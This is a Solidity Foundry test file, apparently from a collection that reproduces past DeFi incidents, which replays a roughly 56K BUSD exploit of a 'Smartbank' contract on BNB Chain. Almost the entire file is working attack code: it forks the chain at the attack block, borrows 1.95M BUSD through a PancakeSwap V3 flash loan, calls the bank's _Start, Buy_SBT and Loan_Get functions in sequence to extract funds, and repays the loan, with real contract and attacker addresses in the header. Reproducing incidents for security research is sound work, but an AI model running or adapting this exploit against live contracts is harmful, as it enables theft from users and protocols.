// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~56K BUSD
// TX : https://app.blocksec.com/explorer/tx/bsc/0x9a8c4c4edb7a76ecfa935780124c409f83a08d15c560bb67302182f8969be20d
// Attacker : https://bscscan.com/address/0x3026c464d3bd6ef0ced0d49e80f171b58176ce32
// Attack Contract : https://bscscan.com/address/0x88f9e1799465655f0dd206093dbd08922a1d9e28
// GUY : https://x.com/0xNickLFranklin/status/1811401263969673654

import "forge-std/Test.sol";
import "./../interface.sol";

interface  Smartbank{
        function _Start() external;
        function Buy_SBT(uint256 _SBT_) external;
        function Loan_Get(uint256 USDT_) external;
}
contract ContractTest is Test {
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 SBT = IERC20(0x94441698165fB7e132e207800B3eA57E34c93a72);
    Smartbank Bank=Smartbank(0x2b45DD1d909c01aAd96fa6b67108D691B432f351);
    Uni_Pair_V3 Pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);

    function setUp() public {
        vm.createSelectFork("bsc", 40378160 - 1);
        deal(address(BUSD),address(this), 1 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker BUSD balance before attack", BUSD.balanceOf(address(this)), 18);
        Pool.flash(address(this),1950000 ether,0,"0x123");
        emit log_named_decimal_uint("Attacker BUSD balance after attack", BUSD.balanceOf(address(this)), 18);
    }
    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        BUSD.approve(address(Bank),type(uint256).max);
        BUSD.transfer(address(Bank),950000 ether);
        SBT.approve(address(Bank),type(uint256).max);
        Bank._Start();
        Bank.Buy_SBT(20_000_000);
        Bank.Loan_Get(1966930);

        BUSD.transfer(address(Pool),1950000 ether + fee0);
    }
    receive() external payable {}
}
